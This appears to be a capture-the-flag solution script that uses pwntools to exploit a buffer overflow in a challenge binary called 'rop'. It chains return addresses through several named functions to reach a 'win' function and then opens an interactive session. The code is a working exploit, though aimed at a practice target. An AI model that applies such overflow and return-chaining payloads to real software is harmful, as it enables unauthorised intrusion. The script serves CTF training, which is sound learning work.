#!/usr/bin/env python3

from pwn import *

binary = ELF('rop')

p = process('./rop')
#p = remote('ctf.umbccd.io', 4100)
p.recvuntil('boys?\n')

rops = ['tilted_towers','junk_junction','snobby_shores','greasy_grove','lonely_lodge','dusty_depot','win']

for i in rops:
	payload  = 8 * b'A'
	payload += p32(binary.symbols['_GLOBAL_OFFSET_TABLE_'])
	payload += 4 * b'B'
	payload += p32(binary.symbols[i])
	payload += p32(binary.symbols['tryme'])
	p.send(payload)

print(p.interactive())

